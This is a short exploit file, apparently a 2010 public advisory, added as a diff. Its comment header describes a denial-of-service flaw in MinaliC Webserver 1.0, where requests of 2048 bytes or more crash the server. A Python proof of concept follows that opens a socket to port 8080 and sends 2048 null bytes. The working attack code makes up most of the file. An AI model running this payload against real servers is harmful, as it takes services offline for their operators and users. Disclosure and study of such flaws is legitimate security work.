@@ -1,0 +1,28 @@
+# ------------------------------------------------------------------------
+# Software................MinaliC Webserver 1.0
+# Vulnerability...........Denial Of Service
+# Download................http://sourceforge.net/projects/minalic/
+# Release Date............10/24/2010
+# Tested On...............Windows XP
+# ------------------------------------------------------------------------
+# Author..................John Leitch
+# Site....................http://www.johnleitch.net/
+# Email...................john.leitch5@gmail.com
+# ------------------------------------------------------------------------
+# 
+# --Description--
+# 
+# Sending a request with a length greater than or equal to 2048 bytes
+# causes the server to crash.
+# 
+# 
+# --PoC--
+
+import socket
+
+host = 'localhost'
+port = 8080
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.send('\x00'*2048)
